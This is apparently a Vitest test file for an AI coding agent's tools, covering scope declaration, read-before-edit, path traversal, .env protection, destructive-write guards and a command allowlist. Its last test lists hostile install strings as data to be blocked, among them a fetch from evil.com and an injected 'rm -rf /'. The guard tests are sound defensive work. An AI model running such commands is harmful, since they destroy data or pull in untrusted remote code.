import { mkdirSync, writeFileSync, rmSync } from 'fs'
import { join } from 'path'
import { tmpdir } from 'os'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import {
  applyUniqueEdit,
  createToolSession,
  executeTool,
  listToolDefinitions,
  ToolError,
  TOOL_DEFINITIONS,
  type ToolContext
} from './index'

describe('tool schemas (JSON Schema, provider-agnostic)', () => {
  it('exports all tools including declare_scope', () => {
    const names = listToolDefinitions().map((t) => t.name).sort()
    expect(names).toEqual(
      [
        'declare_scope',
        'edit_file',
        'grep',
        'list_dir',
        'read_file',
        'run_command',
        'write_file',
        'update_plan',
        'save_memory',
        'web_search',
        'web_fetch'
      ].sort()
    )
  })

  it('each tool has JSON Schema parameters with type object', () => {
    for (const t of TOOL_DEFINITIONS) {
      expect(t.parameters.type).toBe('object')
      expect(t.parameters.properties).toBeTypeOf('object')
      expect(Array.isArray(t.parameters.required)).toBe(true)
      // Must NOT look like Anthropic input_schema or OpenAI nested function wrapper
      expect(t).not.toHaveProperty('input_schema')
      expect(t).not.toHaveProperty('function')
      expect(t).not.toHaveProperty('functionDeclarations')
    }
  })
})

describe('edit_file uniqueness', () => {
  it('applyUniqueEdit replaces a single occurrence', () => {
    expect(applyUniqueEdit('hello world', 'world', 'there')).toBe('hello there')
  })

  it('throws when old_string is missing', () => {
    expect(() => applyUniqueEdit('abc', 'zzz', 'x')).toThrow(ToolError)
    try {
      applyUniqueEdit('abc', 'zzz', 'x')
    } catch (e) {
      expect(e).toBeInstanceOf(ToolError)
      expect((e as ToolError).code).toBe('old_string_not_found')
    }
  })

  it('throws when old_string appears more than once', () => {
    expect(() => applyUniqueEdit('aa aa aa', 'aa', 'b')).toThrow(ToolError)
    try {
      applyUniqueEdit('foo bar foo', 'foo', 'baz')
    } catch (e) {
      expect((e as ToolError).code).toBe('old_string_not_unique')
    }
  })
})

async function declare(ctx: ToolContext, files: string[], reason?: string) {
  const res = await executeTool('declare_scope', { files, reason }, ctx)
  expect(res.ok).toBe(true)
  return res
}

describe('filesystem tools', () => {
  let root: string
  let ctx: ToolContext

  beforeEach(() => {
    root = join(tmpdir(), `nf-agent-tools-${Date.now()}-${Math.random().toString(16).slice(2)}`)
    mkdirSync(join(root, 'src'), { recursive: true })
    writeFileSync(join(root, 'src', 'a.ts'), 'const x = 1\nconst y = 2\n')
    writeFileSync(join(root, 'readme.md'), 'hello tools\n')
    ctx = { rootDir: root, session: createToolSession() }
  })

  afterEach(() => {
    rmSync(root, { recursive: true, force: true })
  })

  it('write_file + read_file + list_dir + grep', async () => {
    await declare(ctx, ['src/b.ts'])

    const w = await executeTool(
      'write_file',
      { path: 'src/b.ts', content: 'export const n = 3\n' },
      ctx
    )
    expect(w.ok).toBe(true)

    const r = await executeTool('read_file', { path: 'src/b.ts' }, ctx)
    expect(r.ok).toBe(true)
    if (r.ok) expect(r.content).toContain('export const n = 3')

    const list = await executeTool('list_dir', { path: 'src' }, ctx)
    expect(list.ok).toBe(true)
    if (list.ok) expect(list.content).toMatch(/a\.ts/)

    const g = await executeTool('grep', { pattern: 'hello', path: '.' }, ctx)
    expect(g.ok).toBe(true)
    if (g.ok) expect(g.content).toMatch(/readme\.md/)
  })

  it('edit_file throws on non-unique old_string', async () => {
    writeFileSync(join(root, 'dup.txt'), 'one two one\n')
    await declare(ctx, ['dup.txt'])
    await executeTool('read_file', { path: 'dup.txt' }, ctx)
    await expect(
      executeTool(
        'edit_file',
        { path: 'dup.txt', old_string: 'one', new_string: 'ONE' },
        ctx
      )
    ).rejects.toMatchObject({ code: 'old_string_not_unique' })
  })

  it('edit_file throws when old_string not found', async () => {
    await declare(ctx, ['readme.md'])
    await executeTool('read_file', { path: 'readme.md' }, ctx)
    await expect(
      executeTool(
        'edit_file',
        { path: 'readme.md', old_string: 'missing', new_string: 'x' },
        ctx
      )
    ).rejects.toMatchObject({ code: 'old_string_not_found' })
  })

  it('edit_file succeeds for unique match', async () => {
    await declare(ctx, ['readme.md'])
    await executeTool('read_file', { path: 'readme.md' }, ctx)
    const res = await executeTool(
      'edit_file',
      { path: 'readme.md', old_string: 'hello', new_string: 'shalom' },
      ctx
    )
    expect(res.ok).toBe(true)
    const r = await executeTool('read_file', { path: 'readme.md' }, ctx)
    expect(r.ok && r.content).toContain('shalom')
  })

  it('blocks path traversal', async () => {
    const res = await executeTool(
      'read_file',
      { path: '../secret.txt' },
      ctx
    )
    expect(res.ok).toBe(false)
  })
})

describe('session guards: scope + read-before-edit', () => {
  let root: string
  let ctx: ToolContext

  beforeEach(() => {
    root = join(tmpdir(), `nf-session-${Date.now()}-${Math.random().toString(16).slice(2)}`)
    mkdirSync(join(root, 'src'), { recursive: true })
    writeFileSync(join(root, 'src', 'a.ts'), 'const x = 1\n')
    writeFileSync(join(root, 'src', 'b.ts'), 'const y = 2\n')
    ctx = { rootDir: root, session: createToolSession() }
  })

  afterEach(() => {
    rmSync(root, { recursive: true, force: true })
  })

  it('rejects write outside declared scope', async () => {
    await declare(ctx, ['src/a.ts'])
    const res = await executeTool(
      'write_file',
      { path: 'src/b.ts', content: 'oops\n' },
      ctx
    )
    expect(res.ok).toBe(false)
    if (!res.ok) {
      expect(res.code).toBe('out_of_scope')
      expect(res.error).toBe('הקובץ לא בהיקף שהצהרת. הצהר היקף חדש עם נימוק.')
    }
  })

  it('rejects edit without prior read', async () => {
    await declare(ctx, ['src/a.ts'])
    await expect(
      executeTool(
        'edit_file',
        { path: 'src/a.ts', old_string: 'x = 1', new_string: 'x = 2' },
        ctx
      )
    ).rejects.toMatchObject({
      code: 'read_before_edit',
      message: 'קרא את הקובץ לפני עריכה.'
    })
  })

  it('allows scope expansion with reason and records it', async () => {
    await declare(ctx, ['src/a.ts'])
    const expand = await executeTool(
      'declare_scope',
      { files: ['src/b.ts'], reason: 'צריך גם את b' },
      ctx
    )
    expect(expand.ok).toBe(true)
    if (expand.ok) {
      expect(expand.content).toContain('היקף הורחב')
      expect(expand.content).toContain('צריך גם את b')
      const data = expand.data as {
        declaration: { expansion: boolean; reason?: string }
        allScoped: string[]
      }
      expect(data.declaration.expansion).toBe(true)
      expect(data.allScoped).toEqual(['src/a.ts', 'src/b.ts'])
    }
    expect(ctx.session!.scopeHistory).toHaveLength(2)

    await executeTool('read_file', { path: 'src/b.ts' }, ctx)
    const edit = await executeTool(
      'edit_file',
      { path: 'src/b.ts', old_string: 'y = 2', new_string: 'y = 3' },
      ctx
    )
    expect(edit.ok).toBe(true)
  })

  it('rejects expansion without reason', async () => {
    await declare(ctx, ['src/a.ts'])
    const res = await executeTool(
      'declare_scope',
      { files: ['src/b.ts'] },
      ctx
    )
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.code).toBe('scope_reason_required')
  })
})

describe('pre-write validation', () => {
  let root: string
  let ctx: ToolContext

  beforeEach(() => {
    root = join(tmpdir(), `nf-validate-${Date.now()}-${Math.random().toString(16).slice(2)}`)
    mkdirSync(join(root, 'src'), { recursive: true })
    writeFileSync(
      join(root, 'package.json'),
      JSON.stringify({ dependencies: { react: '19.0.0' } })
    )
    writeFileSync(
      join(root, 'src', 'UserCard.tsx'),
      `import React from 'react'\nexport interface UserCardProps { name: string; age?: number }\nexport function UserCard({ name, age }: UserCardProps) { return <div>{name}{age}</div> }\n`
    )
    ctx = { rootDir: root, session: createToolSession() }
  })

  afterEach(() => {
    rmSync(root, { recursive: true, force: true })
  })

  it('rejects missing external package', async () => {
    await declare(ctx, ['src/x.ts'])
    const res = await executeTool(
      'write_file',
      {
        path: 'src/x.ts',
        content: `import lodash from 'lodash'\nexport const x = 1\n`
      },
      ctx
    )
    expect(res.ok).toBe(false)
    if (!res.ok) {
      expect(res.code).toBe('package_not_installed')
      expect(res.error).toContain('lodash')
      expect(res.error).toContain('לא מותקנת')
    }
  })

  it('rejects missing local import and lists directory files', async () => {
    await declare(ctx, ['src/App.tsx'])
    const res = await executeTool(
      'write_file',
      {
        path: 'src/App.tsx',
        content: `import { Missing } from './Missing'\nexport function App(){ return null }\n`
      },
      ctx
    )
    expect(res.ok).toBe(false)
    if (!res.ok) {
      expect(res.code).toBe('local_import_missing')
      expect(res.error).toContain('UserCard.tsx')
    }
  })

  it('rejects unknown component props and returns real signature', async () => {
    await declare(ctx, ['src/App.tsx'])
    const res = await executeTool(
      'write_file',
      {
        path: 'src/App.tsx',
        content: `import { UserCard } from './UserCard'\nexport function App(){ return <UserCard name="a" nickname="b" /> }\n`
      },
      ctx
    )
    expect(res.ok).toBe(false)
    if (!res.ok) {
      expect(res.code).toBe('invalid_component_props')
      expect(res.error).toContain('nickname')
      expect(res.error).toContain('UserCardProps')
    }
  })

  it('allows valid local import + valid props', async () => {
    await declare(ctx, ['src/App.tsx'])
    const res = await executeTool(
      'write_file',
      {
        path: 'src/App.tsx',
        content: `import { UserCard } from './UserCard'\nexport function App(){ return <UserCard name="a" age={1} /> }\n`
      },
      ctx
    )
    expect(res.ok).toBe(true)
  })
})

describe('secret-file protection', () => {
  let root: string
  let ctx: ToolContext

  beforeEach(() => {
    root = join(tmpdir(), `nf-tools-secrets-${Date.now()}-${Math.random().toString(36).slice(2)}`)
    mkdirSync(root, { recursive: true })
    writeFileSync(join(root, '.env'), 'SECRET_KEY=real-value', 'utf8')
    writeFileSync(join(root, '.env.example'), 'SECRET_KEY=', 'utf8')
    ctx = { rootDir: root, session: createToolSession() }
  })

  afterEach(() => {
    rmSync(root, { recursive: true, force: true })
  })

  it('read_file blocks .env', async () => {
    const res = await executeTool('read_file', { path: '.env' }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.code).toBe('secret_file')
  })

  it('read_file allows .env.example', async () => {
    const res = await executeTool('read_file', { path: '.env.example' }, ctx)
    expect(res.ok).toBe(true)
  })

  it('grep does not surface secret file contents', async () => {
    const res = await executeTool('grep', { pattern: 'SECRET_KEY', literal: true }, ctx)
    expect(res.ok).toBe(true)
    if (res.ok) {
      expect(res.content).not.toContain('real-value')
    }
  })

  it('write_file blocks .env.local', async () => {
    await executeTool('declare_scope', { files: ['.env.local'] }, ctx)
    const res = await executeTool('write_file', { path: '.env.local', content: 'A=1' }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.code).toBe('secret_file')
  })
})

describe('destructive-write guards', () => {
  let root: string
  let ctx: ToolContext

  beforeEach(() => {
    root = join(tmpdir(), `nf-tools-guards-${Date.now()}-${Math.random().toString(36).slice(2)}`)
    mkdirSync(root, { recursive: true })
    ctx = { rootDir: root, session: createToolSession() }
  })

  afterEach(() => {
    rmSync(root, { recursive: true, force: true })
  })

  it('blocks emptying an existing file', async () => {
    writeFileSync(join(root, 'src.txt'), 'important content here', 'utf8')
    await executeTool('declare_scope', { files: ['src.txt'] }, ctx)
    const res = await executeTool('write_file', { path: 'src.txt', content: ' ' }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.code).toBe('destructive_write')
  })

  it('blocks catastrophic shrink of package.json', async () => {
    writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'x', scripts: { dev: 'vite' }, dependencies: Object.fromEntries(Array.from({ length: 30 }, (_, i) => [`pkg-${i}`, '1.0.0']) ) }, null, 2), 'utf8')
    await executeTool('declare_scope', { files: ['package.json'] }, ctx)
    const res = await executeTool('write_file', { path: 'package.json', content: '{"name":"x"}' }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.code).toBe('destructive_write')
  })

  it('blocks invalid JSON into package.json', async () => {
    await executeTool('declare_scope', { files: ['package.json'] }, ctx)
    const res = await executeTool('write_file', { path: 'package.json', content: '{ broken json' }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.code).toBe('invalid_json')
  })
})

describe('run_command long-running guard', () => {
  it('blocks npm run dev/start/preview', async () => {
    const ctx: ToolContext = { rootDir: tmpdir() }
    for (const script of ['dev', 'start', 'preview']) {
      const res = await executeTool('run_command', { command: `npm run ${script}` }, ctx)
      expect(res.ok).toBe(false)
      if (!res.ok) expect(res.code).toBe('command_not_allowed')
    }
  })
})

describe('update_plan + save_memory', () => {
  let root: string
  let ctx: ToolContext

  beforeEach(() => {
    root = join(tmpdir(), `nf-tools-plan-${Date.now()}-${Math.random().toString(36).slice(2)}`)
    mkdirSync(root, { recursive: true })
    ctx = { rootDir: root, session: createToolSession() }
  })

  afterEach(() => {
    rmSync(root, { recursive: true, force: true })
  })

  it('update_plan writes .nf-blaze/plan.json with normalized stages', async () => {
    const res = await executeTool(
      'update_plan',
      {
        goal: 'CRM מלא',
        stages: [
          { title: 'מודל נתונים', status: 'done' },
          { title: 'טבלת לקוחות', status: 'in_progress' },
          { title: 'לוח עסקאות' }
        ]
      },
      ctx
    )
    expect(res.ok).toBe(true)
    const saved = JSON.parse(
      require('fs').readFileSync(join(root, '.nf-blaze', 'plan.json'), 'utf8')
    )
    expect(saved.goal).toBe('CRM מלא')
    expect(saved.stages).toHaveLength(3)
    expect(saved.stages[0]).toMatchObject({ id: 1, status: 'done' })
    expect(saved.stages[2]).toMatchObject({ id: 3, status: 'pending' })
  })

  it('update_plan rejects empty stages', async () => {
    const res = await executeTool('update_plan', { goal: 'x', stages: [] }, ctx)
    expect(res.ok).toBe(false)
  })

  it('save_memory writes and enforces max length', async () => {
    const ok = await executeTool('save_memory', { content: '# החלטות\n- Vite + React' }, ctx)
    expect(ok.ok).toBe(true)
    const tooLong = await executeTool('save_memory', { content: 'x'.repeat(7000) }, ctx)
    expect(tooLong.ok).toBe(false)
    if (!tooLong.ok) expect(tooLong.code).toBe('memory_too_long')
  })
})

describe('run_command — package installs', () => {
  it('allows npm install with valid package names and safe flags', async () => {
    const { parseAllowlistedCommand } = await import('./run_command')
    expect(parseAllowlistedCommand('npm install dayjs').args).toEqual(['install', 'dayjs'])
    expect(parseAllowlistedCommand('npm install @radix-ui/react-accordion').args).toEqual([
      'install',
      '@radix-ui/react-accordion'
    ])
    expect(parseAllowlistedCommand('npm i zod@3.23.0 -D').args).toEqual(['i', 'zod@3.23.0', '-D'])
  })

  it('blocks dangerous install args', async () => {
    const { parseAllowlistedCommand } = await import('./run_command')
    for (const bad of [
      'npm install --prefix C:/evil pkg',
      'npm install ../local-pkg',
      'npm install git+https://evil.com/x.git',
      'npm install pkg; rm -rf /',
      'npm exec something'
    ]) {
      expect(() => parseAllowlistedCommand(bad)).toThrow()
    }
  })
})
